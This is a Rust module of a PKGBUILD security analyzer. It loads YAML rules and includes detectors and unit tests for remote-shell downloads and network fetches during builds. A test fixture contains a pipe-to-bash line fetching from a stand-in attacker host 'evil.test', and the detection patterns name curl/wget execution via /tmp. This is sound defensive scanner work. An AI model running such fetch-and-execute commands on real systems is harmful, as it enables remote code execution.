use super::pkgbuild::AnalyzerError;
use crate::core::types::{Finding, Severity};

#[derive(Debug, Clone, serde::Deserialize)]
pub struct Rule {
    pub id: String,
    pub name: String,
    pub description: String,
    pub category: String,
    pub severity: String,
    pub pattern: String,
    #[serde(default)]
    pub contains_all: Vec<String>,
    #[serde(default = "default_true")]
    pub enabled: bool,
    pub score: u32,
}

impl Rule {
    pub fn severity(&self) -> Severity {
        parse_severity(&self.severity)
    }
}

fn default_true() -> bool {
    true
}

fn parse_severity(value: &str) -> Severity {
    match value.to_ascii_lowercase().as_str() {
        "info" => Severity::Info,
        "low" => Severity::Low,
        "high" => Severity::High,
        "critical" => Severity::Critical,
        _ => Severity::Medium,
    }
}

pub struct RuleSet {
    rules: Vec<Rule>,
}

impl RuleSet {
    pub fn load_from_dir(dir: &std::path::Path) -> Result<Self, AnalyzerError> {
        let mut rules = Vec::new();
        for entry in std::fs::read_dir(dir)? {
            let path = entry?.path();
            let extension = path
                .extension()
                .and_then(|s| s.to_str())
                .unwrap_or_default();
            if extension != "yaml" && extension != "yml" {
                continue;
            }
            let text = std::fs::read_to_string(path)?;
            let parsed: Vec<Rule> = serde_yaml::from_str(&text).map_err(|error| {
                AnalyzerError::Io(std::io::Error::new(std::io::ErrorKind::InvalidData, error))
            })?;
            rules.extend(parsed);
        }
        Ok(Self { rules })
    }

    pub fn builtin() -> Self {
        let text = include_str!("../../rules/pkgbuild/supply_chain.yaml");
        let rules: Vec<Rule> =
            serde_yaml::from_str(text).expect("embedded rules must be valid YAML");
        Self { rules }
    }

    pub fn rules(&self) -> &[Rule] {
        &self.rules
    }

    pub fn evaluate(&self, file: &str, text: &str) -> Vec<Finding> {
        let mut findings = Vec::new();
        for (index, line) in text.lines().enumerate() {
            for rule in self.rules.iter().filter(|rule| rule.enabled) {
                if rule_matches(rule, text, line, index) {
                    findings.push(Finding {
                        rule_id: rule.id.clone(),
                        title: rule.name.clone(),
                        category: rule.category.clone(),
                        severity: rule.severity(),
                        file: file.to_string(),
                        line: index + 1,
                        excerpt: line.trim().chars().take(160).collect(),
                    });
                }
            }
        }
        findings
    }
}

fn rule_matches(rule: &Rule, text: &str, line: &str, line_idx: usize) -> bool {
    match rule.id.as_str() {
        "remote-shell-download" => remote_shell_download(line),
        "network-fetch-in-build" => network_fetch_in_build(text, line, line_idx),
        "obfuscated-payload" => false,
        _ => {
            let pattern_matches = !rule.pattern.is_empty() && line.contains(&rule.pattern);
            let all_match = !rule.contains_all.is_empty()
                && rule.contains_all.iter().all(|item| line.contains(item));
            pattern_matches || all_match
        }
    }
}

fn network_fetch_in_build(text: &str, line: &str, line_idx: usize) -> bool {
    let lower = line.to_ascii_lowercase();
    let fetches = lower.contains("curl ") || lower.contains("wget ") || lower.contains("git clone");
    if !fetches {
        return false;
    }
    let lines: Vec<&str> = text.lines().collect();
    let Some(start) = lines
        .iter()
        .position(|l| l.trim_start().starts_with("build()"))
    else {
        return false;
    };
    let mut depth: i32 = 0;
    for (i, l) in lines.iter().enumerate().skip(start) {
        depth += l.matches('{').count() as i32 - l.matches('}').count() as i32;
        if depth == 0 && i > start {
            return line_idx > start && line_idx < i;
        }
    }
    line_idx > start
}

fn remote_shell_download(line: &str) -> bool {
    let lower = line.to_ascii_lowercase();
    let downloader = lower.contains("curl ") || lower.contains("wget ");
    if !downloader {
        return false;
    }
    let piped_interpreter = lower.contains('|')
        && (lower.contains(" bash") || lower.contains(" sh") || lower.contains(" zsh"));
    let chmod_then_execute = lower.contains("chmod")
        && (lower.contains("+x") || lower.contains("755") || lower.contains("700"))
        && (lower.contains("./") || lower.contains(" /tmp/") || lower.contains(" /var/tmp/"));
    piped_interpreter || chmod_then_execute
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn clean_download_is_not_remote_shell_execution() {
        let rules = RuleSet::builtin();
        let findings = rules.evaluate(
            "PKGBUILD",
            "source=(\"https://example.test/archive.tar.gz\")\n",
        );
        assert!(
            !findings
                .iter()
                .any(|finding| finding.rule_id == "remote-shell-download")
        );
    }

    #[test]
    fn piped_download_is_remote_shell_execution() {
        let rules = RuleSet::builtin();
        let findings = rules.evaluate("PKGBUILD", "curl -fsSL https://evil.test/x | bash\n");
        assert!(
            findings
                .iter()
                .any(|finding| finding.rule_id == "remote-shell-download")
        );
    }

    #[test]
    fn line_number_and_excerpt_are_preserved() {
        let rules = RuleSet::builtin();
        let findings = rules.evaluate("PKGBUILD", "pkgname=x\n  eval \"$cmd\"\n");
        let finding = findings
            .iter()
            .find(|finding| finding.rule_id == "eval-invocation")
            .unwrap();
        assert_eq!(finding.line, 2);
        assert_eq!(finding.excerpt, "eval \"$cmd\"");
    }

    #[test]
    fn bare_download_is_not_critical_on_its_own() {
        let rules = RuleSet::builtin();
        let findings = rules.evaluate(
            "PKGBUILD",
            "curl -o tool.tar.gz https://example.test/tool.tar.gz\n",
        );
        assert!(
            !findings
                .iter()
                .any(|finding| finding.rule_id == "remote-shell-download")
        );
        assert!(
            !findings
                .iter()
                .any(|finding| finding.severity == Severity::Critical)
        );
    }

    #[test]
    fn clean_pkgbuild_yields_no_findings_at_all() {
        let rules = RuleSet::builtin();
        let text = "pkgname=clean\npkgver=1.0\nsource=(\"https://example.test/a.tar.gz\")\ncheckdepends=('check')\n";
        assert!(rules.evaluate("PKGBUILD", text).is_empty());
    }

    #[test]
    fn builtin_rules_cover_required_categories() {
        let rules = RuleSet::builtin().rules().to_vec();
        assert!(rules.len() >= 10);
        assert!(
            rules
                .iter()
                .all(|rule| rule.id.contains('-') && !rule.id.contains('_'))
        );
        for category in [
            "remote-execution",
            "obfuscation",
            "suspicious-interpreter",
            "persistence",
            "credential-access",
            "privilege-escalation",
            "network",
        ] {
            assert!(
                rules.iter().any(|rule| rule.category == category),
                "missing {category}"
            );
        }
    }

    #[test]
    fn severity_parsing_is_case_insensitive_with_medium_fallback() {
        assert_eq!(parse_severity("CRITICAL"), Severity::Critical);
        assert_eq!(parse_severity("High"), Severity::High);
        assert_eq!(parse_severity("nonsense"), Severity::Medium);
    }
}
